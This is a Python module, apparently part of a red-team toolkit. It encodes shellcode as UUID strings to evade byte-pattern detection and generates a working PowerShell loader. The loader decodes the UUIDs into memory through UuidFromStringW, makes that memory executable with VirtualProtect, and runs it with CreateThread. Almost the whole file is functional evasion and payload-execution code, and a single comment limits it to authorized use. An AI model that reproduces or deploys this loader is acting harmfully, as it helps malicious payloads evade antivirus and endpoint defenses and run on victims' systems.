"""UUID shellcode encoder.

Encodes shellcode bytes as a list of UUID strings.
Bypasses basic string/byte pattern detection tools that look for shellcode
byte sequences but don't parse UUID arrays.

Technique origin: MDSec research / Sektor7.

Wire format:
    Each 16 bytes of shellcode → 1 UUID string in standard format.
    Decoder reverses the UUID list back to bytes.

Loader stub (C): parse UUID array → VirtualAlloc + UuidFromStringA loop.
"""
from __future__ import annotations

import uuid


def uuid_encode(data: bytes) -> bytes:
    """Encode shellcode bytes as UUID array representation.

    Args:
        data: Shellcode bytes. Padded to multiple of 16 if needed.

    Returns:
        Bytes of UUID strings joined by newlines.
        Each line: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    """
    # Pad to multiple of 16
    if len(data) % 16 != 0:
        pad_len = 16 - (len(data) % 16)
        data = data + b"\x90" * pad_len  # NOP pad

    uuids: list[str] = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        # Build UUID from raw bytes (custom byte order for the loader)
        u = uuid.UUID(bytes=chunk)
        uuids.append(str(u))

    return "\n".join(uuids).encode()


def uuid_decode(encoded: bytes) -> bytes:
    """Decode UUID-encoded shellcode back to bytes.

    Args:
        encoded: Bytes from uuid_encode (newline-separated UUIDs).

    Returns:
        Original shellcode bytes.
    """
    lines = encoded.decode("utf-8", errors="replace").strip().split("\n")
    result = bytearray()
    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            u = uuid.UUID(line)
            result.extend(u.bytes)
        except ValueError:
            continue
    return bytes(result)


def generate_uuid_loader_ps1(encoded: bytes) -> str:
    """Generate a PowerShell loader for UUID-encoded shellcode.

    Uses UuidFromStringA (via Add-Type P/Invoke) to decode and execute.

    Args:
        encoded: Output from uuid_encode().

    Returns:
        PowerShell script string.
    """
    uuid_lines = encoded.decode("utf-8", errors="replace").strip().split("\n")
    uuid_array = ",\n    ".join(f'"{u.strip()}"' for u in uuid_lines if u.strip())

    return f"""
# Forge Suite v5 APEX — UUID Shellcode Loader
# FOR AUTHORIZED RED TEAM OPERATIONS ONLY
$Guids = @(
    {uuid_array}
)

$size = $Guids.Count * 16
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
$ptr = $mem

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class UuidLoader {{
    [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
    public static extern int UuidFromStringW(string StringUuid, IntPtr Uuid);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}}
"@

foreach ($g in $Guids) {{
    [UuidLoader]::UuidFromStringW($g, $ptr)
    $ptr = [IntPtr]($ptr.ToInt64() + 16)
}}

$oldProtect = 0
[UuidLoader]::VirtualProtect($mem, [System.UIntPtr]$size, 0x40, [ref]$oldProtect)
$hThread = [UuidLoader]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[UuidLoader]::WaitForSingleObject($hThread, 0xFFFFFFFF)
"""
